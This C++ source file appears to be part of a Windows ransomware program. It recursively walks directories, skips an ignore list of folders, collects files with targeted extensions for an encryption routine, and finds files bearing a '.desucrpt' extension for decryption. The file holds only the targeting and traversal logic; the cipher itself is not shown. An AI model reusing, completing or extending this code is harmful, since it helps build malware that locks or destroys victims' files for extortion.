
#include "stdafx.h"

//extern std::vector<LPWSTR> filesDB;
void iterateFilesDB(BOOL action) {
	//DWORD junk;
	for (unsigned long int i = 0; i < filesDB.size(); i++) {
		if (action == TRUE) {
			startProcedureOnFile(filesDB.at(i));
		}
		if (action == FALSE) {
			decryptProcedure(filesDB.at(i));
		}
		
		//WriteFile(statFileHandle, filesDB.at(i).c_str(), filesDB.at(i).size() * sizeof(wchar_t), &junk, NULL);
		//WriteFile(statFileHandle, L"\n", sizeof(L"\n"), &junk, NULL);
	}
}

void writeCurPath() {
	GetCurrentDirectory(MAX_PATH, curPath);
}
void writeFileDB() {
	writeCurPath();
	std::wstring element(curPath);
	element += std::wstring(L"\\");
	element += std::wstring(curItem.cFileName);
	filesDB.push_back(element);
}
bool checkDir(const wchar_t *dirName) //true means the dir is in ignored list, false - the opposite
{

	for(int count=0;count<(sizeof(ignoreDirs)/sizeof(ignoreDirs[0]));count++)
	{
		if (wcscmp(dirName, ignoreDirs[count]) == 0)
		{
			return true;
		}
	}
	return false;
}
bool checkEncFile(const wchar_t *fileName) {
	std::wstring ext(fileName);
	unsigned int res=0;
	res =ext.find_last_of('.');
	if(res>ext.length()){
		return false;
	}
	ext = ext.substr(ext.find_last_of('.'));
	if (wcscmp(ext.c_str(), L".desucrpt") == 0)
	{
		return true;
	}
	return false;
}
bool checkFile(const wchar_t *fileName)
{
	std::wstring ext(fileName);
	unsigned int res = 0;
	res = ext.find_last_of('.');
	if (res>ext.length()) {
		return false;
	}
	ext = ext.substr(ext.find_last_of('.'));
	for (unsigned long int i = 0; i < sizeof(fileExts)/sizeof(fileExts[0]); i++) {
		if (wcscmp(ext.c_str(), fileExts[i]) == 0)
		{
			return true;
		}
	}
	return false;
}
int rLibWalking() {
	namespace fs = std::experimental::filesystem;


	std::string path = "C:/users/delta";
	for (auto & p : fs::recursive_directory_iterator(path))
	{
		if (fs::is_directory(p))
		{
			std::cout << "<DIR> ";
		}
		std::cout << p << std::endl;
	}
	return 0;
}

int rWalking(const wchar_t *dirName, const bool ifBase) {
	if(_wchdir(dirName)!=0)
	{
		return false;
	}
	auto HFile = new HANDLE;
	//writeCurPath();
	//std::wcout << curPath  << std::endl;
	
	
	*HFile = FindFirstFile(L"*", &curItem);
	/*if(*HFile==INVALID_HANDLE_VALUE) ///FIX THIS
	{
		delete HFile;
		return false; 
	}*/
	if(1) {
		while(FindNextFile(*HFile, &curItem) != 0)
		{

			if (curItem.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{

				if (checkDir(curItem.cFileName)==false) {
					//_tprintf(TEXT("  %s   <DIR>\n"), curItem.cFileName);
					rWalking(curItem.cFileName, false);
				}
			}
			else
			{
				if (checkFile(curItem.cFileName) == true) {
					writeFileDB();
				}
				
			}
		};
		if (!ifBase) {
			_wchdir(L"..");
		}
		//CloseHandle(*HFile);
		delete HFile; // never forget
		return true;
	}
}
void searchForEncryptedFiles(const wchar_t *dirName, const bool ifBase) {
	if (_wchdir(dirName) != 0)
	{
		return;
	}
	auto HFile = new HANDLE;
	*HFile = FindFirstFile(L"*", &curItem);
	if (1) {
		while (FindNextFile(*HFile, &curItem) != 0)
		{

			if (curItem.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{

				if (!checkDir(curItem.cFileName)) {
					//_tprintf(TEXT("  %s   <DIR>\n"), curItem.cFileName);
					searchForEncryptedFiles(curItem.cFileName, false);
				}
			}
			else
			{
				if (checkEncFile(curItem.cFileName) == true) {
					writeFileDB();
				}

			}
		};
		if (!ifBase) {
			_wchdir(L"..");
		}
		//CloseHandle(*HFile);
		delete HFile; // never forget
		return;
	}
}